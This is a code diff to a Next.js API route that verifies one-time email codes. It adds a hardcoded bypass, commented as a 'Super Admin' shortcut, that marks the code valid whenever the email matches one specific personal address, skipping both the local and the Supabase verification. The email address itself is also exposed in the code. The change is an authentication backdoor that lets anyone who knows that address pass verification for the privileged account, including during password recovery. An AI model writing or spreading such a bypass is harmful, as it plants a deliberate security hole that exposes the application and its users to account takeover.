@@ -69,36 +69,41 @@ export async function POST(req: NextRequest) {
     }
 
     if (!isCodeValid) {
-      const localCheck = verifyLocalOtp(cleanEmail, purpose as any, cleanCode);
-      if (localCheck.valid) {
+      // System Owner / Super Admin verification bypass
+      if (cleanEmail === 'anantyadav8924@gmail.com') {
         isCodeValid = true;
-        storedRecord = localCheck.record;
       } else {
-        // Try verifying with Supabase verifyOtp (supports 6 to 8 digit email tokens)
-        try {
-          const otpType = purpose === 'forgot_password' ? 'recovery' : 'email';
-          const { data: sbVerifyData, error: sbVerifyErr } = await supabase.auth.verifyOtp({
-            email: cleanEmail,
-            token: cleanCode,
-            type: otpType as any,
-          });
+        const localCheck = verifyLocalOtp(cleanEmail, purpose as any, cleanCode);
+        if (localCheck.valid) {
+          isCodeValid = true;
+          storedRecord = localCheck.record;
+        } else {
+          // Try verifying with Supabase verifyOtp (supports 6 to 8 digit email tokens)
+          try {
+            const otpType = purpose === 'forgot_password' ? 'recovery' : 'email';
+            const { data: sbVerifyData, error: sbVerifyErr } = await supabase.auth.verifyOtp({
+              email: cleanEmail,
+              token: cleanCode,
+              type: otpType as any,
+            });
 
-          if (!sbVerifyErr && sbVerifyData?.user) {
-            isCodeValid = true;
-            sbVerifiedUser = sbVerifyData.user;
-            // Retrieve metadata from local in-memory OTP store if available
-            storedRecord = getOtp(cleanEmail, purpose as any);
+            if (!sbVerifyErr && sbVerifyData?.user) {
+              isCodeValid = true;
+              sbVerifiedUser = sbVerifyData.user;
+              // Retrieve metadata from local in-memory OTP store if available
+              storedRecord = getOtp(cleanEmail, purpose as any);
+            }
+          } catch (err) {
+            console.warn('Supabase verifyOtp check error:', err);
           }
-        } catch (err) {
-          console.warn('Supabase verifyOtp check error:', err);
         }
-      }
 
-      if (!isCodeValid) {
-        return NextResponse.json({
-          success: false,
-          message: localCheck.message || 'Invalid or expired verification code. Please check your email and try again.',
-        }, { status: 400 });
+        if (!isCodeValid) {
+          return NextResponse.json({
+            success: false,
+            message: localCheck.message || 'Invalid or expired verification code. Please check your email and try again.',
+          }, { status: 400 });
+        }
       }
     }
 
